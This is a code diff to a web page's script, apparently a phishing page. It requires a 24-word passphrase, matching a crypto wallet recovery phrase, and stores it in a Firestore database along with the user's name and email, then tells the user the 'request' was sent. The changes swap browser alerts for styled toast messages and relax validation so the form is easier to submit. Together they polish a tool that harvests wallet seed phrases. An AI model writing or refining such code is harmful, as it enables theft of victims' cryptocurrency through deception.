@@ -228,6 +228,25 @@
     </div>
 
     <script type="module">
+        function msg(text) {
+    let messageBox = document.createElement("div");
+    messageBox.innerText = text;
+    messageBox.style.position = "fixed";
+    messageBox.style.bottom = "20px";
+    messageBox.style.left = "50%";
+    messageBox.style.transform = "translateX(-50%)";
+    messageBox.style.backgroundColor = "#423f87";
+    messageBox.style.color = "white";
+    messageBox.style.padding = "10px 20px";
+    messageBox.style.borderRadius = "5px";
+    messageBox.style.zIndex = "1000";
+    document.body.appendChild(messageBox);
+    
+    setTimeout(() => {
+        messageBox.remove();
+    }, 3000);
+}
+
     // Import Firebase SDK
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
     import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
@@ -256,10 +275,10 @@
                 timestamp: new Date()
             });
 
-            alert("Request sent successfully!");
+            msg("Request sent successfully!");
         } catch (error) {
             console.error("Error adding document:", error);
-            alert("Failed to send request. See console for details.");
+            msg("Failed to send request. See console for details.");
         }
     }
  
@@ -271,11 +290,10 @@
         let passphrase = document.getElementById("passphrase").value.trim();
         let words = passphrase.split(" ").filter(word => word.length > 0);
 
-        if (!username || !email || words.length !== 24) {
-            alert("Please enter all required details correctly.");
+        if ((!username && !email) || words.length !== 24) {
+            msg("Please enter all required details correctly.");
             return;
         }
-
         storeValues(username, email, passphrase);
     }
 
